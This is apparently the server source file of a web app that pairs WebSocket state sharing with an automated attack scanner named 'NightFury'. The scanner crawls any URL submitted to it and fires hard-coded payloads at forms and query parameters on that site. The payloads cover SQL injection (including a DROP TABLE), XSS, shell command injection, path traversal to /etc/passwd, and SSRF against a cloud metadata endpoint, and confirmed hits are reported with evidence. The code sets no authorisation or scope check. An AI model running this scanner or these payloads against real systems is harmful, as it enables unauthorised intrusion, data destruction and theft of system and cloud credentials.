import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { WebSocketServer, WebSocket } from "ws";
import { createServer } from "http";
import axios from "axios";
import * as cheerio from "cheerio";

async function startServer() {
  const app = express();
  const server = createServer(app);
  const PORT = 3000;

  app.use(express.json());

  // Simple in-memory state for the investigation
  let currentState: any = null;

  // WebSocket Server
  const wss = new WebSocketServer({ server });

  const broadcast = (data: any) => {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(data));
      }
    });
  };

  wss.on("connection", (ws) => {
    console.log("New client connected");

    // Send the current state to the new client if it exists
    if (currentState) {
      ws.send(JSON.stringify({ type: "SYNC_STATE", payload: currentState }));
    }

    ws.on("message", (message) => {
      try {
        const data = JSON.parse(message.toString());

        if (data.type === "UPDATE_STATE") {
          currentState = data.payload;
          // Broadcast the update to all other clients
          wss.clients.forEach((client) => {
            if (client !== ws && client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: "UPDATE_STATE", payload: currentState }));
            }
          });
        }
      } catch (e) {
        console.error("Failed to process message:", e);
      }
    });

    ws.on("close", () => {
      console.log("Client disconnected");
    });
  });

  // NightFury Offensive Logic
  const VECTORS: Record<string, string[]> = {
    sqli: [
      "' OR '1'='1' -- ",
      "' UNION SELECT NULL, user(), database() -- ",
      "'; DROP TABLE users; -- ",
      "admin' -- ",
      "1' AND SLEEP(5) -- "
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "javascript:alert('XSS')",
      "';alert(String.fromCharCode(88,83,83));//"
    ],
    rce: [
      "; cat /etc/passwd",
      "| whoami",
      "& dir",
      "$(id)",
      "`id`"
    ],
    lfi: [
      "../../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "/etc/passwd",
      "C:\\Windows\\System32\\drivers\\etc\\hosts"
    ],
    ssrf: [
      "http://169.254.169.254/latest/meta-data/",
      "http://localhost:8080/admin",
      "file:///etc/passwd"
    ]
  };

  const INDICATORS: Record<string, string[]> = {
    sqli: ['sql', 'mysql', 'database error', 'syntax error', 'you have an error'],
    xss: ['<script>', 'alert(', 'onerror=', 'prompt('],
    rce: ['uid=', 'root:', 'www-data', 'bin/bash', 'winver'],
    lfi: ['root:x:', '[extensions]', 'file content'],
    ssrf: ['instance-id', 'localhost', 'metadata']
  };

  const checkSuccess = (response: string, vector: string) => {
    const respLower = response.toLowerCase();
    for (const ind of INDICATORS[vector] || []) {
      if (respLower.includes(ind.toLowerCase())) {
        const idx = respLower.indexOf(ind.toLowerCase());
        const start = Math.max(0, idx - 50);
        const end = Math.min(response.length, idx + 100);
        return { success: true, evidence: response.substring(start, end) };
      }
    }
    return { success: false, evidence: "" };
  };

  app.post("/api/nightfury/scan", async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: "URL is required" });

    res.json({ status: "started" });

    broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Starting NightFury scan on ${url}` });

    try {
      const response = await axios.get(url, { timeout: 10000, validateStatus: () => true });
      const $ = cheerio.load(response.data);
      
      const urls = [url];
      $('a[href]').each((_, el) => {
        try {
          const href = $(el).attr('href');
          if (href) urls.push(new URL(href, url).href);
        } catch (e) {}
      });

      const uniqueUrls = Array.from(new Set(urls)).slice(0, 5); // Limit to 5 for demo
      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Discovered ${uniqueUrls.length} endpoints` });

      for (const targetUrl of uniqueUrls) {
        broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Testing ${targetUrl}` });
        
        const pageResp = await axios.get(targetUrl, { timeout: 5000, validateStatus: () => true });
        const $page = cheerio.load(pageResp.data);
        
        const forms: any[] = [];
        $page('form').each((_, el) => {
          const action = $page(el).attr('action');
          const method = ($page(el).attr('method') || 'get').toLowerCase();
          const inputs: Record<string, string> = {};
          $page(el).find('input[name]').each((_, input) => {
            const name = $page(input).attr('name');
            if (name) inputs[name] = $page(input).attr('value') || '';
          });
          forms.push({ action, method, inputs });
        });

        if (forms.length === 0) {
          // Test URL parameters if no forms
          const parsedUrl = new URL(targetUrl);
          if (parsedUrl.searchParams.size > 0) {
            forms.push({
              action: targetUrl,
              method: 'get',
              inputs: Object.fromEntries(parsedUrl.searchParams)
            });
          }
        }

        for (const form of forms) {
          const submitUrl = form.action ? new URL(form.action, targetUrl).href : targetUrl;
          
          for (const [vector, payloads] of Object.entries(VECTORS)) {
            for (const payload of payloads) {
              const testData = { ...form.inputs };
              const firstField = Object.keys(testData)[0];
              if (!firstField) continue;
              testData[firstField] = payload;

              try {
                let resp;
                if (form.method === 'post') {
                  resp = await axios.post(submitUrl, testData, { timeout: 3000, validateStatus: () => true });
                } else {
                  resp = await axios.get(submitUrl, { params: testData, timeout: 3000, validateStatus: () => true });
                }

                const { success, evidence } = checkSuccess(resp.data, vector);
                if (success) {
                  const result = {
                    id: Math.random().toString(36).substr(2, 9),
                    url: submitUrl,
                    vector,
                    payload,
                    success: true,
                    evidence,
                    timestamp: new Date().toISOString()
                  };
                  broadcast({ type: "OFFENSIVE_RESULT", payload: result });
                  broadcast({ type: "OFFENSIVE_LOG", payload: `[SUCCESS] ${vector.toUpperCase()} found on ${submitUrl}` });
                }
              } catch (e) {
                // Ignore individual injection failures
              }
            }
          }
        }
      }

      broadcast({ type: "OFFENSIVE_LOG", payload: "[*] NightFury scan completed." });
    } catch (error: any) {
      broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Scan failed: ${error.message}` });
    }
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
